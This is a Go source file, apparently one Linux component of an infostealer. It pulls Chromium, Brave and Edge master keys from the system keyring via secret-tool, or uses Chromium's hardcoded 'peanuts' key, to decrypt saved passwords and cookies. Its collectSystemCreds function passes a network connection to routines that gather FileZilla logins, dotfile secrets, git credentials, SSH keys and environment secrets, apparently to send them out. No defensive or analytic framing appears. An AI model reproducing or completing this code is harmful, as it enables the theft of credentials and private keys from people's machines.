//go:build linux

package main

// Linux credential collection. Chromium picks one of two key sources:
//   - a real keyring (gnome-keyring / KWallet) reachable through libsecret,
//     which `secret-tool` exposes without linking the library
//   - the historical hardcoded key "peanuts" (still used when no keyring is
//     available, e.g. headless or minimal desktops)
// Both feed the same AES-128-CBC "v10" scheme.

import (
	"net"
	"os/exec"
	"strings"
)

func secretToolPassword() string {
	if _, err := exec.LookPath("secret-tool"); err != nil {
		return ""
	}
	for _, app := range []string{"chrome", "chromium", "brave", "microsoft-edge"} {
		cmd := exec.Command("secret-tool", "lookup", "application", app)
		out, err := cmd.Output()
		if err == nil {
			if s := strings.TrimSpace(string(out)); s != "" {
				return s
			}
		}
	}
	return ""
}

func newSecretBox(br browserRoot) (*secretBox, string) {
	if pass := secretToolPassword(); pass != "" {
		key, err := deriveKey(pass, "saltysalt", 1, 16)
		if err == nil {
			return &secretBox{key: key, scheme: "v10 AES-128-CBC + libsecret"}, "v10 AES-128-CBC + libsecret 主密钥"
		}
	}
	key, err := deriveKey("peanuts", "saltysalt", 1, 16)
	if err != nil {
		return &secretBox{scheme: "none"}, "PBKDF2 失败: " + err.Error()
	}
	return &secretBox{key: key, scheme: "v10 AES-128-CBC + peanuts"},
		"v10 AES-128-CBC + 硬编码 peanuts 密钥（无 keyring 时 Chromium 的默认行为）"
}

func (b *secretBox) decrypt(blob []byte, cookie bool) (string, bool) {
	plain, ok := cbcDecrypt(b.key, blob)
	if !ok {
		return "", false
	}
	if cookie {
		plain = stripCookiePrefix(plain)
	}
	return strings.TrimRight(string(plain), "\x00"), true
}

func (b *secretBox) failNote(blob []byte) string {
	if len(b.key) == 0 {
		return "无主密钥，无法解密"
	}
	return "解密失败（可能是 keyring 密钥，需 secret-service 上下文）"
}

func collectSystemCreds(c net.Conn) {
	fileZilla(c)
	dotfileSecrets(c)
	gitCredentials(c)
	sshKeys(c)
	envSecrets(c)
}
